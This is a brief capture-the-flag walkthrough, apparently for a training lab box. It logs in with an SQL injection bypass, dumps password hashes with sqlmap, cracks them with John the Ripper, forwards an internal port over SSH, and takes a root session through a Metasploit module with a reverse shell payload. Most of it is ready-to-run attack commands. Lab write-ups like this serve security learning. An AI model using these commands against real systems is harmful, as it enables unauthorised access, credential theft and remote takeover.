you get into the website through an sql injection using

```
' or 1=1 #
```

intercept a search request with burp and put the content into a dump file

use sqlmap to get the password hashes from the dump

```
sqlmap -r search-request-dump.txt --dbms=mysql --dump
```

use john the ripper on the password has

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

Can now ssh onto the box

using the following you find a running service you cannot get to from an outside connection due to firewall rules (port 10000)

```
ss -tulpn
```

you use reverse ssh to forward the traffic to you so you can see the page on your local host

```
ssh -L 10000:localhost:10000 agent47@10.10.209.139
```

you can then login to with the agent47 credentials to access whatever is on this service

you can then use searchsploit to find vulns since once you login you see the CMS and version of it

use the metasploit module

set it up as normal but also do the following

```
set payload cmd/unix/reverse 
set ssl false
```

then **exploit** which will make a session which you can drop into and get the root flag

```
sessions -i 1
```